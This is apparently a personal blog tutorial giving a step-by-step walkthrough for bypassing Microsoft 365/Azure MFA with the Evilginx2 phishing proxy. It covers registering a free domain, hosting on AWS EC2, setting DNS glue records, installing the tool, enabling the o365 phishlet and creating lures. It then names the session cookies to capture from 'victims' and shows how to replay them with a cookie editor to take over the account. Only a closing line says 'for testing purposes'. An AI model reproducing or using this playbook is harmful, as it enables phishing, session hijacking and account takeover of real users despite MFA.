---
description: >-
  In that blog I will try to explain which implementation that I have done in
  order to bypass MFA in Azure.
---

# Bypassing MFA with Evilginx2

### Take a domain name in Freenom.&#x20;

[freenom.com ](https://freenom.com)is giving you great opportunity to take free domain names so just a grab one there.&#x20;

After taking a domain name. You need to create EC2 instance in your AWS accoount. Of course you can use some virtual private server provider or some hosting provider but for me it was easy to configure that in AWS.&#x20;

I have configured AWS ubuntu in my account.&#x20;

And uploaded to there evilginx2 phishing tool. For evilginx2 tool worked properly you should configure DNS records there, without configuring these records it will be hard to get tokens of your victims.&#x20;

As the first step you need to install go in your instance.&#x20;

```
apt install golang-go
go get -u github.com/kgretzky/evilginx2
sudo apt-get -y install git make
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
make install
```

&#x20;Now you should not run evilginx because we didn't configure our DNS.&#x20;

Let's turn back to our freenom.com page and manage our domain.&#x20;

![](<../../.gitbook/assets/image (4).png>)



From that section go to DNS configuration place.&#x20;

![](<../../.gitbook/assets/image (5).png>)

Then Manage DNS section.&#x20;

![](<../../.gitbook/assets/image (2).png>)

Put there the subdomains that you want to use. Actually, it depends on which phishlets you will use. But in my case I have used o365 phishlet so, I have added to there `account` and `login`. &#x20;

And your EC2 instance public IP that you will use.&#x20;

After adding these we need to implement our nameserver glue records.&#x20;

![](<../../.gitbook/assets/image (3).png>)

From that section you need to put your domain name records.&#x20;

![](<../../.gitbook/assets/image (1).png>)



In my case, I have added my domain name record there and my public EC2 instance IP.&#x20;

yeah after that comes waiting part because changing these records to be implemented in the system takes time.&#x20;

After adding these sections go to your EC2 instance and connect via the terminal.&#x20;

Probably you will have problem with DNS, HTTPS, HTTP connections. So you need to be aware these are open to all IPs with your security groups.&#x20;

I have done some DNS implementations in my AWS EC2 instance. Maybe that will not work for you case but in case you will have a problem when you run evilginx. Like `Failed to conned port 53` . Here is the solution that worked for me.&#x20;

```
 sudo rm /etc/resolv.conf
 ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
 systemctl stop systemd-resolved.service
```

in your /etc/hosts file add that section.&#x20;

```
internal-ip yourdomain.com
```

After these configurations run your evilginx with debug because I was not able to configure any phishlet to save tokens.&#x20;



run these commands for running evilginx in debug mode.&#x20;

```
evilginx -debug
```



in evilginx2 run these command,&#x20;

```
config domain yourdomain.com
config ip a.b.c.d

blacklist unauth

phishlets enable o365
lures create o365
lures edit #putIDthere redirect_url https://portal.azure.com
lures get-url #putIDthere

```

After getting the URL from evilginx open an incognito browser and test.&#x20;

In my case, evilginx was not able to save tokens of my victims(my account here). But in debug mode, I was able to see these tokens.&#x20;



For o365 phishlet, you need to sniff these tokens&#x20;

```
ESTSAUTHPERSISTENT
ESTSAUTH
ESTSAUTHLIGHT
SignInStateCookie
```

![](<../../.gitbook/assets/image (2) (1).png>)



After taking these values go to your browser and with cookie editor extension change these while trying to login [https://www.office.com/?auth=2](https://www.office.com/?auth=2) and refresh the page.&#x20;

You are in.&#x20;

```
Please use it for testing purposes. 
```



